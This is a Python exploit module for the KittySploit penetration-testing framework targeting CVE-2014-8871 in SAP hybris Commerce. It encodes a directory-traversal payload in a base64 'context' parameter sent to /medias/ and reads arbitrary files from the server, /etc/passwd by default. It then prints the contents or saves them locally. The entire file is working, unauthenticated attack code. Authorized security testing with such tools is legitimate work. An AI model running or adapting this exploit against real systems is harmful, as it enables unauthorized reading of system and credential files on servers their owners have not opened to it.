#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""hybris Commerce medias context file read (CVE-2014-8871)."""

import base64

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.protocols.http.lfi import Lfi


class Module(Auxiliary, Http_client, Lfi):
    __info__ = {
        'name': 'hybris Commerce - medias context File Read (CVE-2014-8871)',
        'description': (
            'Reads arbitrary files via CVE-2014-8871 base64 context parameter on /medias/.'
        ),
        'author': ['KittySploit Team'],
        'cve': ['CVE-2014-8871'],
        'platform': Platform.MULTI,
        'references': [
            'https://nvd.nist.gov/vuln/detail/CVE-2014-8871',
            'https://www.redteam-pentesting.de/advisories/rt-sa-2014-016',
        ],
        'tags': ['hybris', 'sap', 'lfi', 'file-read', 'unauth', 'cve-2014-8871'],
        'agent': {
            'risk': 'intrusive',
            'effects': ['data_exfiltration'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': True,
            'produces': ['risk_signals'],
            'cost': 1.2,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0, 'min_params': 0,
                'tech_hints_any': [], 'tech_hints_all': [],
                'specializations_any': [], 'risk_signals_any': [],
                'auth_session': False, 'capabilities_any': [], 'capabilities_all': [],
                'confidence_min': {}, 'confidence_min_any': {},
                'endpoint_pattern_any': [], 'param_any': [], 'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'file_read', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['scanner/http/cve_2014_8871_detect'],
            },
        },
    }

    file_read = OptString('/etc/passwd', 'Absolute remote file path to read', required=True)
    output_file = OptString('', 'Local file to write retrieved content', required=False)
    output_limit = OptInteger(12000, 'Max chars to print when output_file empty (0=full)', required=False, advanced=True)

    def execute(self, file_path: str) -> str:
        remote = str(file_path or '').strip()
        if not remote:
            return ''
        if remote.startswith('/'):
            remote = remote[1:]
        clear = f'master|root|12345|text/plain|../../../../../../{remote}|'
        ctx = base64.b64encode(clear.encode()).decode('ascii')
        r = self.http_request(
            method='GET',
            path=f'/medias/?context={ctx}',
            allow_redirects=False,
        )
        if not r:
            return ''
        return r.text or ''

    def run(self):
        target = str(self.file_read or '/etc/passwd')
        print_status(f'Reading {target} via hybris medias context ...')
        body = self.execute(target)
        if not body:
            print_error('Empty response')
            return False
        out = str(self.output_file or '').strip()
        if out:
            with open(out, 'w', encoding='utf-8', errors='replace') as fh:
                fh.write(body)
            print_success(f'Wrote {len(body)} bytes to {out}')
        else:
            limit = int(self.output_limit or 0)
            print_info(body if limit <= 0 else body[:limit])
        return True
